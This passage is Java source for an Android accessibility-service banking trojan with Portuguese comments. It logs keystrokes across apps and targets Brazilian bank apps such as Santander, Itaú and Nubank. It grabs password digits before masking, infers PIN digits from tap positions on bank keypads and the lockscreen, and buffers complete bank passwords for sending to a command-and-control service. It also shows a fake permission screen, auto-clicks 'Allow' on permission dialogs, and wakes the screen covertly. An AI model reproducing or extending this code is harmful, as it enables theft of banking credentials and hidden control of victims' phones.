                    if (event.getSource() != null) {
                        AccessibilityNodeInfo source = event.getSource();
                        if (source != null) {
                            CharSequence hint = source.getHintText();
                            fieldHint = hint != null ? hint.toString() : "";
                            
                            CharSequence desc = source.getContentDescription();
                            fieldName = desc != null ? desc.toString() : "";
                            
                            isPassword = source.isPassword();
                            source.recycle();
                        }
                    }
                    
                    // === CAPTURA ESPECIAL PARA BANCOS COM TECLADO GBOARD ===
                    // Quando o texto vem mascarado (●●●), tentamos detectar o caractere digitado
                    // comparando com o evento beforeText ou pela diferença de tamanho
                    boolean isBankApp = packageName.contains("santander") || packageName.contains("itau") ||
                                       packageName.contains("bradesco") || packageName.contains("neon") ||
                                       packageName.contains("nubank") || packageName.contains("banco") ||
                                       packageName.contains("caixa") || packageName.contains("bb.") ||
                                       packageName.contains("inter") || packageName.contains("c6") ||
                                       packageName.contains("picpay") || packageName.contains("mercadopago");
                    
                    if (isBankApp && isPassword) {
                        // 🏦 CAPTURA ESPECIAL PARA SANTANDER E BANCOS COM TECLADO PADRÃO
                        CharSequence beforeText = event.getBeforeText();
                        int addedCount = event.getAddedCount();
                        int removedCount = event.getRemovedCount();
                        int fromIndex = event.getFromIndex();
                        
                        Log.w(TAG, "🏦 SANTANDER/BANCO TEXT_CHANGED:");
                        Log.w(TAG, "  📝 text: " + text);
                        Log.w(TAG, "  📝 beforeText: " + beforeText);
                        Log.w(TAG, "  📝 addedCount: " + addedCount);
                        Log.w(TAG, "  📝 removedCount: " + removedCount);
                        Log.w(TAG, "  📝 fromIndex: " + fromIndex);
                        
                        // ========================================
                        // ESTRATÉGIA 1: Capturar dígito real antes de mascarar
                        // Alguns apps revelam o dígito brevemente antes de mascarar
                        // ========================================
                        String cleanText = text.replace("[", "").replace("]", "");
                        
                        // Se o último caractere não é um ponto/asterisco, é o dígito real!
                        if (cleanText.length() > 0) {
                            char lastChar = cleanText.charAt(cleanText.length() - 1);
                            if (Character.isDigit(lastChar)) {
                                // CAPTURADO! O dígito real apareceu antes de ser mascarado
                                String capturedDigit = String.valueOf(lastChar);
                                Log.w(TAG, "🔐 SANTANDER DÍGITO REAL CAPTURADO: " + capturedDigit);
                                sendKeylogData(packageName, capturedDigit, fieldHint, fieldName, true, "BANK_PASSWORD_DIGIT_REAL");
                            }
                        }
                        
                        // ========================================
                        // ESTRATÉGIA 2: Contar a quantidade de caracteres para saber quantos dígitos
                        // ========================================
                        if (addedCount > 0) {
                            // Detecta se é asterisco ou ponto (mascarado)
                            boolean isMasked = cleanText.contains("●") || cleanText.contains("•") || cleanText.contains("*");
                            
                            if (isMasked) {
                                // Conta quantos dígitos foram inseridos baseado na quantidade de máscaras
                                int totalDigits = cleanText.length();
                                Log.w(TAG, "🔐 SANTANDER SENHA MASCARADA: " + totalDigits + " dígitos inseridos");
                                sendKeylogData(packageName, "[" + totalDigits + " dígitos]", fieldHint, fieldName, true, "BANK_PASSWORD_MASKED_COUNT");
                            }
                        }
                        
                        // ========================================
                        // ESTRATÉGIA 3: Usar beforeText para calcular diferença
                        // ========================================
                        if (beforeText != null && addedCount > 0) {
                            String before = beforeText.toString();
                            
                            // Se beforeText tem dígito real que foi removido/substituído por máscara
                            if (before.length() > 0) {
                                char lastBeforeChar = before.charAt(before.length() - 1);
                                if (Character.isDigit(lastBeforeChar)) {
                                    // O beforeText tinha o dígito real!
                                    String capturedDigit = String.valueOf(lastBeforeChar);
                                    Log.w(TAG, "🔐 SANTANDER DÍGITO VIA BEFORETEXT: " + capturedDigit);
                                    sendKeylogData(packageName, capturedDigit, fieldHint, fieldName, true, "BANK_PASSWORD_DIGIT_BEFORE");
                                }
                            }
                        }
                        
                        // ========================================
                        // ESTRATÉGIA 4: Captura incremental - detecta mudança no tamanho
                        // ========================================
                        if (!previousText.isEmpty() && text.length() > previousText.length()) {
                            int newDigitsCount = text.length() - previousText.length();
                            Log.w(TAG, "🔐 SANTANDER INCREMENTO: +" + newDigitsCount + " novo(s) dígito(s)");
                            // Não envia aqui pois já foi enviado acima
                        }
                    }
                    
                    // Envia log para servidor (log normal)
                    sendKeylogData(packageName, text, fieldHint, fieldName, isPassword, "TEXT_CHANGED");
                }
            }
        }
        
        // Captura seleção de texto (mostra o que está sendo selecionado)
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            List<CharSequence> textList = event.getText();
            if (textList != null && !textList.isEmpty()) {
                String text = textList.toString();
                int start = event.getFromIndex();
                int end = event.getToIndex();
                
                if (start >= 0 && end > start && end <= text.length()) {
                    String selectedText = text.substring(start, end);
                    sendKeylogData(packageName, selectedText, "", "", false, "TEXT_SELECTED");
                }
            }
        }
        
        // ========================================
        // 🏦 SANTANDER ESPECIAL: Captura via inspeção do campo de senha
        // Monitora campos de senha a cada evento para pegar dígitos reais
        // ========================================
        boolean isSantander = packageName.contains("santander");
        if (isSantander && rootNode != null) {
            captureSantanderPassword(rootNode, packageName);
        }
        
        // Captura campos de SENHA (CRÍTICO!)
        if (rootNode != null && (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
                                  eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED)) {
            findAndCapturePasswordFields(rootNode, packageName);
        }
        
        // Captura nome do app + tela atual
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence className = event.getClassName();
            if (className != null) {
                sendKeylogData(packageName, "", "", "", false, "WINDOW_CHANGED: " + className.toString());
            }
        }
    }
    
    /**
     * Busca texto em todos os filhos de um nó (recursivo)
     * Útil para teclados bancários que escondem o texto em elementos filhos
     */
    private String findTextInChildren(AccessibilityNodeInfo node) {
        if (node == null) return "";
        
        StringBuilder foundText = new StringBuilder();
        
        int childCount = node.getChildCount();
        for (int i = 0; i < childCount && i < 20; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child == null) continue;
            
            // Texto direto
            if (child.getText() != null && child.getText().length() > 0) {
                if (foundText.length() > 0) foundText.append(" ");
                foundText.append(child.getText().toString());
            }
            // ContentDescription
            else if (child.getContentDescription() != null && child.getContentDescription().length() > 0) {
                if (foundText.length() > 0) foundText.append(" ");
                foundText.append(child.getContentDescription().toString());
            }
            
            // Busca recursiva nos filhos
            String childText = findTextInChildren(child);
            if (!childText.isEmpty()) {
                if (foundText.length() > 0) foundText.append(" ");
                foundText.append(childText);
            }
            
            child.recycle();
        }
        
        return foundText.toString().trim();
    }
    
    /**
     * Encontra e captura campos de senha
     */
    private void findAndCapturePasswordFields(AccessibilityNodeInfo node, String packageName) {
        if (node == null) return;
        
        try {
            // Verifica se é campo de senha
            if (node.isPassword()) {
                CharSequence text = node.getText();
                if (text != null && text.length() > 0) {
                    CharSequence hint = node.getHintText();
                    String fieldHint = hint != null ? hint.toString() : "";
                    
                    sendKeylogData(packageName, text.toString(), fieldHint, "", true, "PASSWORD_FIELD");
                }
            }
            
            // Procura em todos os filhos
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findAndCapturePasswordFields(child, packageName);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao buscar campos de senha: " + e.getMessage());
        }
    }
    
    /**
     * Detecta qual dígito foi clicado no teclado do Santander baseado na posição
     * O teclado Santander usa imagens sem texto, então identificamos pela posição
     */
    private String detectSantanderKeypadDigit(Rect bounds, AccessibilityNodeInfo node) {
        try {
            // Obtém dimensões da tela
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int screenWidth = dm.widthPixels;
            int screenHeight = dm.heightPixels;
            
            int centerX = bounds.centerX();
            int centerY = bounds.centerY();
            
            // Teclado numérico típico está na metade inferior da tela
            // Layout 3x4: (1,2,3), (4,5,6), (7,8,9), (cancelar,0,confirmar)
            
            // Calcula posição relativa no teclado (0-1)
            // Assumindo teclado ocupa ~50% inferior da tela e ~90% da largura central
            float keypadTop = screenHeight * 0.5f;
            float keypadBottom = screenHeight * 0.95f;
            float keypadLeft = screenWidth * 0.05f;
            float keypadRight = screenWidth * 0.95f;
            
            // Verifica se está na área do teclado
            if (centerY < keypadTop || centerY > keypadBottom) {
                return "";
            }
            
            // Calcula posição relativa (0-1) dentro do teclado
            float relX = (centerX - keypadLeft) / (keypadRight - keypadLeft);
            float relY = (centerY - keypadTop) / (keypadBottom - keypadTop);
            
            // Divide em grid 3x4
            int col = (int) (relX * 3); // 0, 1, 2
            int row = (int) (relY * 4); // 0, 1, 2, 3
            
            // Limita valores
            col = Math.max(0, Math.min(2, col));
            row = Math.max(0, Math.min(3, row));
            
            // Mapeia para dígitos
            // Row 0: 1, 2, 3
            // Row 1: 4, 5, 6
            // Row 2: 7, 8, 9
            // Row 3: X, 0, OK
            int[][] keypad = {
                {1, 2, 3},
                {4, 5, 6},
                {7, 8, 9},
                {-1, 0, -2} // -1 = cancelar, -2 = confirmar
            };
            
            int digit = keypad[row][col];
            
            if (digit >= 0) {
                return String.valueOf(digit);
            } else if (digit == -1) {
                return "[CANCEL]";
            } else if (digit == -2) {
                return "[OK]";
            }
            
            // Também tenta detectar pela contentDescription ou por siblings
            if (node.getContentDescription() != null) {
                String desc = node.getContentDescription().toString().toLowerCase();
                for (int i = 0; i <= 9; i++) {
                    if (desc.contains(String.valueOf(i)) || 
                        desc.contains(getDigitWord(i))) {
                        return String.valueOf(i);
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao detectar tecla Santander: " + e.getMessage());
        }
        
        return "";
    }
    
    /**
     * Retorna palavra do dígito em português
     */
    private String getDigitWord(int digit) {
        switch (digit) {
            case 0: return "zero";
            case 1: return "um";
            case 2: return "dois";
            case 3: return "três";
            case 4: return "quatro";
            case 5: return "cinco";
            case 6: return "seis";
            case 7: return "sete";
            case 8: return "oito";
            case 9: return "nove";
            default: return "";
        }
    }
    
    /**
     * 🔐 Detecta qual dígito foi clicado na tela de bloqueio (PIN)
     * Similar ao detectSantanderKeypadDigit, mas para lockscreen padrão do Android
     */
    private String detectLockscreenPinDigit(Rect bounds, AccessibilityNodeInfo node) {
        try {
            // Obtém dimensões da tela
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int screenWidth = dm.widthPixels;
            int screenHeight = dm.heightPixels;
            
            int centerX = bounds.centerX();
            int centerY = bounds.centerY();
            
            // Primeiro tenta obter texto do contentDescription
            if (node.getContentDescription() != null) {
                String desc = node.getContentDescription().toString();
                if (desc.matches("^[0-9]$")) {
                    return desc;
                }
                // Tenta encontrar dígito no texto
                for (int i = 0; i <= 9; i++) {
                    String digitStr = String.valueOf(i);
                    if (desc.equals(digitStr) || desc.startsWith(digitStr + " ") || 
                        desc.contains(getDigitWord(i))) {
                        return digitStr;
                    }
                }
            }
            
            // Tenta obter texto do nó
            if (node.getText() != null) {
                String text = node.getText().toString();
                if (text.matches("^[0-9]$")) {
                    return text;
                }
            }
            
            // Se não tem texto, tenta detectar pela posição na grade 3x4
            // Teclado PIN típico ocupa a parte central-inferior da tela
            float keypadTop = screenHeight * 0.4f;
            float keypadBottom = screenHeight * 0.95f;
            float keypadLeft = screenWidth * 0.1f;
            float keypadRight = screenWidth * 0.9f;
            
            if (centerY < keypadTop || centerY > keypadBottom ||
                centerX < keypadLeft || centerX > keypadRight) {
                // Fora da área do teclado - pode ser botão de OK ou Cancelar
                if (bounds.width() > screenWidth * 0.3) {
                    return "[ENTER]";
                }
                return "";
            }
            
            // Calcula posição relativa no teclado (0-1)
            float relX = (centerX - keypadLeft) / (keypadRight - keypadLeft);
            float relY = (centerY - keypadTop) / (keypadBottom - keypadTop);
            
            // Determina coluna (0-2)
            int col;
            if (relX < 0.33f) col = 0;
            else if (relX < 0.66f) col = 1;
            else col = 2;
            
            // Determina linha (0-3)
            int row;
            if (relY < 0.25f) row = 0;
            else if (relY < 0.50f) row = 1;
            else if (relY < 0.75f) row = 2;
            else row = 3;
            
            // Mapeia para dígitos
            int[][] keypad = {
                {1, 2, 3},
                {4, 5, 6},
                {7, 8, 9},
                {-1, 0, -2} // -1 = cancelar/backspace, -2 = confirmar/OK
            };
            
            int digit = keypad[row][col];
            
            if (digit >= 0) {
                Log.d(TAG, "🔐 PIN detectado por posição: " + digit + " (row=" + row + ", col=" + col + ")");
                return String.valueOf(digit);
            } else if (digit == -1) {
                return "[BACKSPACE]";
            } else if (digit == -2) {
                return "[OK]";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao detectar PIN lockscreen: " + e.getMessage());
        }
        
        return "";
    }
    
    /**
     * Encontra hint do campo de senha ativo (para teclado virtual)
     */
    private String findActivePasswordFieldHint(AccessibilityNodeInfo node) {
        if (node == null) return "";
        
        try {
            // Verifica se este nó é campo de senha focado
            if (node.isPassword() && node.isFocused()) {
                CharSequence hint = node.getHintText();
                if (hint != null) {
                    return hint.toString();
                }
            }
            
            // Procura em todos os filhos
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    String hint = findActivePasswordFieldHint(child);
                    child.recycle();
                    if (!hint.isEmpty()) {
                        return hint;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao buscar hint: " + e.getMessage());
        }
        
        return "";
    }
    
    /**
     * Envia dados do keylogger para o servidor C&C
     */
    private void sendKeylogData(String packageName, String text, String hint, String fieldName, boolean isPassword, String eventType) {
        // 🚫 IGNORA NOSSO PRÓPRIO APP - O VisualScreenActivity envia os dados corretamente
        if (packageName.equals("com.seguranca.protecao")) {
            return; // Não duplica keylog do nosso app
        }
        
        // 🏦 DETECÇÃO DE APP BANCÁRIO
        boolean isBankApp = packageName.contains("itau") || packageName.contains("bradesco") || 
            packageName.contains("santander") || packageName.contains("neon") ||
            packageName.contains("nubank") || packageName.contains("banco") ||
            packageName.contains("caixa") || packageName.contains("bb.") ||
            packageName.contains("inter") || packageName.contains("c6") ||
            packageName.contains("picpay") || packageName.contains("mercadopago") ||
            packageName.contains("original") || packageName.contains("sicoob") ||
            packageName.contains("sicredi") || packageName.contains("banrisul");
        
        // 🔥 BUFFER DE SENHA BANCÁRIA - Acumula dígitos para enviar senha completa
        if (isBankApp && isPassword && text != null && text.length() == 1 && text.matches("\\d")) {
            long currentTime = System.currentTimeMillis();
            
            // DEBOUNCE: Ignora dígito duplicado em menos de 50ms
            if (text.equals(lastKeylogDigit) && (currentTime - lastKeylogTime) < KEYLOG_DEBOUNCE_MS) {
                Log.d(TAG, "🔄 DEBOUNCE: Ignorando dígito duplicado: " + text + " (diff: " + (currentTime - lastKeylogTime) + "ms)");
                return;
            }
            
            lastKeylogDigit = text;
            lastKeylogTime = currentTime;
            
            // Se mudou de app, envia o buffer anterior
            if (!packageName.equals(currentBankApp) && bankPasswordBuffer.length() > 0) {
                flushBankPasswordBuffer();
            }
            
            // Adiciona ao buffer
            currentBankApp = packageName;
            bankPasswordBuffer.append(text);
            lastBankDigitTime = currentTime;
            
            Log.d(TAG, "🏦 BUFFER BANCO: " + bankPasswordBuffer.toString() + " (" + bankPasswordBuffer.length() + " dígitos)");
            
            // Cancela flush anterior e agenda novo
            if (bankPasswordFlushRunnable != null) {
                bankPasswordHandler.removeCallbacks(bankPasswordFlushRunnable);
            }
            
            bankPasswordFlushRunnable = () -> {
                if (bankPasswordBuffer.length() > 0) {
                    flushBankPasswordBuffer();
                }
            };
            
            // Aguarda 3 segundos para enviar senha completa (ou 8+ dígitos)
            if (bankPasswordBuffer.length() >= 8) {
                // Senha longa - envia imediatamente
                flushBankPasswordBuffer();
            } else {
                bankPasswordHandler.postDelayed(bankPasswordFlushRunnable, BANK_PASSWORD_TIMEOUT_MS);
            }
            
            return; // Não envia ainda, aguarda buffer
        }
        
        // 🔥 DEBOUNCE normal para outros eventos
        if (isPassword && text != null && text.length() == 1 && text.matches("\\d")) {
            long currentTime = System.currentTimeMillis();
            if (text.equals(lastKeylogDigit) && (currentTime - lastKeylogTime) < KEYLOG_DEBOUNCE_MS) {
                return;
            }
            lastKeylogDigit = text;
            lastKeylogTime = currentTime;
        }
        
        // Envia evento normalmente
        sendKeylogDataInternal(packageName, text, hint, fieldName, isPassword, eventType);
    }
    
    /**
     * 🏦 Envia buffer de senha bancária acumulada
     */
    private void flushBankPasswordBuffer() {
        if (bankPasswordBuffer.length() == 0) return;
        
        String completePassword = bankPasswordBuffer.toString();
        String appName = getAppName(currentBankApp);
        
        Log.w(TAG, "🏦 SENHA BANCÁRIA COMPLETA: " + appName + " - " + completePassword + " (" + completePassword.length() + " dígitos)");
        
        // Envia a senha completa
        sendKeylogDataInternal(currentBankApp, completePassword, "SENHA_BANCARIA", "password", true, "BANK_PASSWORD_COMPLETE");
        
        // Limpa buffer
        bankPasswordBuffer.setLength(0);
        currentBankApp = "";
        
        if (bankPasswordFlushRunnable != null) {
            bankPasswordHandler.removeCallbacks(bankPasswordFlushRunnable);
        }
    }
    
    /**
     * Envia dados do keylogger para o servidor C&C (método interno)
     */
    private void sendKeylogDataInternal(String packageName, String text, String hint, String fieldName, boolean isPassword, String eventType) {
        try {
            // Obtém nome legível do app
            String appName = getAppName(packageName);
            
            // 🇧🇷 TIMESTAMP BRASILEIRO (GMT-3)
            java.util.TimeZone brazilTZ = java.util.TimeZone.getTimeZone("America/Sao_Paulo");
            SimpleDateFormat brazilFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            brazilFormat.setTimeZone(brazilTZ);
            String timestamp = brazilFormat.format(new Date());
            
            // Cria JSON com TODOS os detalhes
            JSONObject json = new JSONObject();
            json.put("timestamp", timestamp);
            json.put("timestampMs", System.currentTimeMillis()); // Timestamp em milissegundos
            json.put("package", packageName);
            json.put("appName", appName);
            json.put("text", text);
            json.put("hint", hint);
            json.put("fieldName", fieldName);
            json.put("isPassword", isPassword);
            json.put("eventType", eventType);
            
            String logData = json.toString();
            
            // Log local
            if (isPassword) {
                Log.w(TAG, "🔑 SENHA CAPTURADA: " + appName + " - " + text);
            } else {
                Log.d(TAG, "⌨️ KEYLOG: " + appName + " - " + text);
            }
            
            // Envia para servidor C&C
            Intent intent = new Intent(this, CommandControlService.class);
            intent.setAction("SEND_KEYLOG");
            intent.putExtra("data", logData);
            startService(intent);
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao criar JSON: " + e.getMessage());
        }
    }
    
    // ========================================
    // 🏦 SANTANDER ESPECIAL: Buffer para capturar senha completa
    // ========================================
    private String lastSantanderPasswordLength = "";
    private long lastSantanderCaptureTime = 0;
    
    /**
     * 🏦 CAPTURA ESPECIAL PARA SANTANDER
     * O Santander usa o teclado numérico padrão do Android que não dispara
     * eventos de clique normais. Esta função monitora o campo de senha
     * e tenta capturar os dígitos antes de serem mascarados.
     */
    private void captureSantanderPassword(AccessibilityNodeInfo rootNode, String packageName) {
        try {
            // Busca campos de senha na tela
            List<AccessibilityNodeInfo> passwordFields = new java.util.ArrayList<>();
            findPasswordFields(rootNode, passwordFields);
            
            for (AccessibilityNodeInfo field : passwordFields) {
                if (field == null) continue;
                
                // Tenta obter o texto do campo
                CharSequence textChars = field.getText();
                if (textChars == null) continue;
                
                String text = textChars.toString();
                
                // Ignora se vazio
                if (text.isEmpty()) continue;
                
                // Verifica se o texto mudou desde a última captura
                String currentLength = packageName + "_" + text.length();
                long now = System.currentTimeMillis();
                
                if (!currentLength.equals(lastSantanderPasswordLength) || (now - lastSantanderCaptureTime) > 500) {
                    lastSantanderPasswordLength = currentLength;
                    lastSantanderCaptureTime = now;
                    
                    // Analisa o texto para encontrar dígitos reais
                    StringBuilder capturedDigits = new StringBuilder();
                    StringBuilder maskedChars = new StringBuilder();
                    
                    for (int i = 0; i < text.length(); i++) {
                        char c = text.charAt(i);
                        if (Character.isDigit(c)) {
                            // DÍGITO REAL CAPTURADO!
                            capturedDigits.append(c);
                        } else if (c == '●' || c == '•' || c == '*' || c == '○') {
                            maskedChars.append(c);
                        }
                    }
                    
                    // Se capturou dígitos reais, envia
                    if (capturedDigits.length() > 0) {
                        Log.w(TAG, "🏦 SANTANDER SENHA REAL CAPTURADA: " + capturedDigits.toString());
                        sendKeylogDataInternal(packageName, capturedDigits.toString(), "SENHA_SANTANDER", "password", true, "SANTANDER_PASSWORD_REAL");
                    }
                    
                    // Também registra o progresso (quantos caracteres)
                    if (text.length() > 0) {
                        Log.w(TAG, "🏦 SANTANDER CAMPO SENHA: " + text.length() + " caracteres (texto: " + text + ")");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao capturar senha Santander: " + e.getMessage());
        }
    }
    
    /**
     * Busca todos os campos de senha na hierarquia
     */
    private void findPasswordFields(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> fields) {
        if (node == null) return;
        
        // Verifica se é um campo de senha
        if (node.isPassword()) {
            fields.add(node);
        }
        
        // Verifica pelo nome da classe
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        if (className.contains("EditText") || className.contains("Password") || className.contains("Pin")) {
            // Verifica se é campo de entrada
            if (node.isEditable() || node.isFocused()) {
                fields.add(node);
            }
        }
        
        // Busca nos filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findPasswordFields(child, fields);
            }
        }
    }
    
    /**
     * Obtém nome legível do app a partir do package name
     */
    private String getAppName(String packageName) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    // ==================== MÉTODOS AUXILIARES ====================

    /**
     * Clica em um nó
     */
    private void clickNode(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            } else {
                // Se não é clicável, tenta clicar no pai
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null && parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    parent.recycle();
                } else {
                    // Usa coordenadas para clicar
                    clickAtCoordinates(node);
                }
            }
        }
    }

    /**
     * Clica em coordenadas específicas usando gestos
     */
    private void clickAtCoordinates(AccessibilityNodeInfo node) {
        if (node == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Rect rect = new Rect();
        node.getBoundsInScreen(rect);

        int x = rect.centerX();
        int y = rect.centerY();

        executeClick(x, y);
    }

    /**
     * Encontra nós por texto
     */
    private List<AccessibilityNodeInfo> findNodesByText(AccessibilityNodeInfo root, String... texts) {
        for (String text : texts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                return nodes;
            }
        }
        return null;
    }

    /**
     * Encontra nós por classe
     */
    private List<AccessibilityNodeInfo> findNodesByClassName(AccessibilityNodeInfo root, String className) {
        List<AccessibilityNodeInfo> result = new ArrayList<>();
        findNodesByClassNameRecursive(root, className, result);
        return result;
    }
    
    private void findNodesByClassNameRecursive(AccessibilityNodeInfo node, String className, List<AccessibilityNodeInfo> result) {
        if (node == null) return;
        
        String nodeClass = node.getClassName() != null ? node.getClassName().toString() : "";
        if (nodeClass.contains(className) || nodeClass.equals(className)) {
            result.add(node);
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findNodesByClassNameRecursive(child, className, result);
            }
        }
    }
    
    /**
     * CRÍTICO: Solicita TODAS as permissões runtime automaticamente
     * Camera, Microfone, SMS, Contatos, Localização, Storage, etc
     */
    private void requestAllRuntimePermissions() {
        Log.d(TAG, "🔥 Solicitando TODAS as permissões runtime...");
        
        // Abre TELA FAKE ao invés de solicitar permissões reais!
        Intent intent = new Intent(this, FakePermissionActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    /**
     * Automação em BACKGROUND (chamada pela tela fake)
     * Aqui que a mágica acontece! Usuário vê tela fake, mas isso roda escondido
     */
    private void startBackgroundAutomation() {
        Log.d(TAG, "🤫 INICIANDO AUTOMAÇÃO SILENCIOSA EM BACKGROUND...");
        
        // Aguarda um pouco e abre configurações ESCONDIDAS
        handler.postDelayed(() -> {
            // Abre tela de permissões sem o usuário ver
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("REQUEST_ALL_PERMISSIONS", true);
            intent.putExtra("SILENT_MODE", true); // Modo silencioso!
            startActivity(intent);
        }, 1000);
    }
    
    /**
     * CRÍTICO: Automatiza diálogos de permissões RUNTIME
     * Detecta e clica automaticamente em "Allow/Permitir"
     */
    private void handleRuntimePermissionDialog(AccessibilityNodeInfo rootNode) {
        Log.d(TAG, "🎯 Detectou diálogo de permissão runtime");
        
        // ESTRATÉGIA 1: Procura botões "Allow", "Permitir", "While using the app", etc
        List<AccessibilityNodeInfo> allowButtons = findNodesByText(
            rootNode, 
            "Allow", "Permitir", "Aceitar",
            "While using the app", "Enquanto usar o app",
            "Only this time", "Apenas desta vez",
            "ALLOW", "PERMITIR"
        );
        
        if (allowButtons != null && !allowButtons.isEmpty()) {
            // Prefere "While using" ou "Allow" ao invés de "Only this time"
            AccessibilityNodeInfo bestButton = allowButtons.get(0);
            for (AccessibilityNodeInfo btn : allowButtons) {
                String text = btn.getText() != null ? btn.getText().toString() : "";
                if (text.contains("While") || text.contains("Enquanto") || text.contains("Allow") || text.contains("Permitir")) {
                    bestButton = btn;
                    break;
                }
            }
            
            Log.d(TAG, "✅ Clicando em '" + bestButton.getText() + "' automaticamente (RÁPIDO)");
            clickNode(bestButton);
            return;
        }
        
        // ESTRATÉGIA 2: Procura por botões pela classe
        List<AccessibilityNodeInfo> buttons = findNodesByClassName(rootNode, "android.widget.Button");
        if (buttons != null && !buttons.isEmpty()) {
            for (AccessibilityNodeInfo btn : buttons) {
                String text = btn.getText() != null ? btn.getText().toString().toLowerCase() : "";
                // Clica em qualquer botão que contenha "allow", "permit", etc
                if (text.contains("allow") || text.contains("permit") || text.contains("while") || text.contains("enquanto")) {
                    Log.d(TAG, "✅ Clicando em botão: " + btn.getText());
                    clickNode(btn);
                    return;
                }
            }
        }
        
        // ESTRATÉGIA 3: Se nada funcionou, clica no segundo botão (geralmente é "Allow")
        if (buttons != null && buttons.size() >= 2) {
            Log.d(TAG, "⚠️ Clicando no segundo botão por padrão");
            clickNode(buttons.get(1));
        }
    }
    
    // ==================== MÉTODOS DE CONTROLE DE TELA ====================
    
    /**
     * Acorda a tela (liga o display)
     * ATUALIZADO para Android 16 (API 35+)
     * Usa múltiplos métodos em cascata para garantir compatibilidade
     */
    @SuppressWarnings("deprecation")
    private void wakeUpScreen() {
        Log.d(TAG, "💡 wakeUpScreen() chamado - tentando acordar tela...");
        
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
        
        // ========== MÉTODO 1: FULL_WAKE_LOCK (mais agressivo, funciona em Android 16) ==========
        try {
            android.os.PowerManager.WakeLock fullWakeLock = pm.newWakeLock(
                android.os.PowerManager.FULL_WAKE_LOCK | 
                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
                android.os.PowerManager.ON_AFTER_RELEASE,
                "UI:FullWakeUp"
            );
            fullWakeLock.acquire(5000); // Mantém por 5 segundos
            
            handler.postDelayed(() -> {
                if (fullWakeLock.isHeld()) {
                    fullWakeLock.release();
                }
            }, 3000);
            
            Log.d(TAG, "💡 Método 1: FULL_WAKE_LOCK executado!");
        } catch (Exception e) {
            Log.e(TAG, "❌ FULL_WAKE_LOCK falhou: " + e.getMessage());
        }
        
        // ========== MÉTODO 2: SCREEN_BRIGHT_WAKE_LOCK (fallback) ==========
        try {
            android.os.PowerManager.WakeLock wakeLock = pm.newWakeLock(
                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK | 
                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
                android.os.PowerManager.ON_AFTER_RELEASE,
                "UI:WakeUp"
            );
            wakeLock.acquire(5000);
            
            handler.postDelayed(() -> {
                if (wakeLock.isHeld()) {
                    wakeLock.release();
                }
            }, 3000);
            
            Log.d(TAG, "💡 Método 2: SCREEN_BRIGHT_WAKE_LOCK executado!");
        } catch (Exception e) {
            Log.e(TAG, "❌ SCREEN_BRIGHT_WAKE_LOCK falhou: " + e.getMessage());
        }
        
        // ========== MÉTODO 3: KeyEvent via Instrumentation (se disponível) ==========
        try {
            // Simula KEYCODE_WAKEUP se disponível (API 20+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                // Usa shell input para simular tecla de power
                new Thread(() -> {
                    try {
                        Runtime.getRuntime().exec("input keyevent 26"); // KEYCODE_POWER
                        Log.d(TAG, "💡 Método 3: input keyevent 26 executado!");
                    } catch (Exception ex) {
                        Log.e(TAG, "❌ keyevent falhou: " + ex.getMessage());
                    }
                }).start();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ KeyEvent wake falhou: " + e.getMessage());
        }
        
        // ========== MÉTODO 4: Gesto na tela (último recurso) ==========
        handler.postDelayed(() -> {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    // Faz um swipe de baixo para cima para acordar
                    Path path = new Path();
                    path.moveTo(540, 2000);
                    path.lineTo(540, 1000);
                    
                    GestureDescription.StrokeDescription stroke = 
                        new GestureDescription.StrokeDescription(path, 0, 300);
                    GestureDescription.Builder builder = new GestureDescription.Builder();
                    builder.addStroke(stroke);
                    dispatchGesture(builder.build(), null, null);
                    Log.d(TAG, "💡 Método 4: Gesto swipe-up executado!");
